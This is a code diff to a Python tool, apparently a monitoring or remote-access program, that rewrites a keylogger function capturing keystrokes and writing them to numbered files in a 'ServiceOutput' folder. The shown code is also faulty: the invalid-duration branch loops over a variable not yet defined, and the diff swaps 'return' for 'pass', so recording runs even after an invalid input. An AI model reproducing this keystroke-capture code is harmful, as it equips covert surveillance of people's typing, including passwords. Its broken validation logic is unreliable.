@@ -59,19 +59,18 @@ def screenshot():
 
 
 def keylogger(duration):
+    curDir = os.getcwd()
+    saveDir = os.path.join(curDir, "ServiceOutput")
+    id = len(os.listdir(saveDir))
+    name = "key_logger" + str(id) + ".txt"
+    outputDir = os.path.join(saveDir, name)
     if duration < 0 or duration > 99:
-        curDir = os.getcwd()
-        saveDir = os.path.join(curDir, "ServiceOutput")
-        id = len(os.listdir(saveDir))
-        name = "key_logger" + str(id) + ".txt"
-        outputDir = os.path.join(saveDir, name)
-
         with open(outputDir, "w") as file:
             for kl in recorded_keys:
                 file.write(
                     "Invalid time duration. Please input time duration greater than 0 and lower than 99."
                 )
-        return
+        pass
     recorded_keys = []
     escape = False
 
@@ -90,12 +89,6 @@ def keylogger(duration):
         pass
 
     keyboard.unhook_all()
-
-    curDir = os.getcwd()
-    saveDir = os.path.join(curDir, "ServiceOutput")
-    id = len(os.listdir(saveDir))
-    name = "key_logger" + str(id) + ".txt"
-    outputDir = os.path.join(saveDir, name)
 
     with open(outputDir, "w") as file:
         for kl in recorded_keys:
